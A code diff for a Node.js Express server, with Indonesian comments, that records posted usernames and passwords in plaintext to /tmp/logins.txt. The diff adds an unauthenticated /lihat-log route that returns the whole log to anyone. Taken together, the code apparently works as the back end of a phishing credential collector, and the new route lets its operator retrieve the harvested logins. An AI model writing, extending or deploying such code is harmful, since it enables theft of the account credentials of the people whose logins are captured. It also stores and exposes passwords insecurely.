@@ -14,7 +14,7 @@ app.post('/simpan', (req, res) => {
   const { username, password } = req.body;
   const logData = `Username: ${username}, Password: ${password}\n`;
 
-  const logPath = path.join('/tmp', 'logins.txt'); // Ubah ke /tmp agar bisa disimpan di server Render
+  const logPath = path.join('/tmp', 'logins.txt');
 
   fs.appendFile(logPath, logData, (err) => {
     if (err) {
@@ -26,6 +26,20 @@ app.post('/simpan', (req, res) => {
 });
 
 app.get('/', (req, res) => res.send("API aktif bro!"));
+
+// ✅ Tambahkan ini
+app.get('/lihat-log', (req, res) => {
+  const logPath = path.join('/tmp', 'logins.txt');
+
+  fs.readFile(logPath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Gagal baca log:', err);
+      return res.status(500).send('Gagal baca log');
+    }
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(data);
+  });
+});
 
 app.listen(PORT, () => {
   console.log(`Server aktif di port ${PORT}`);
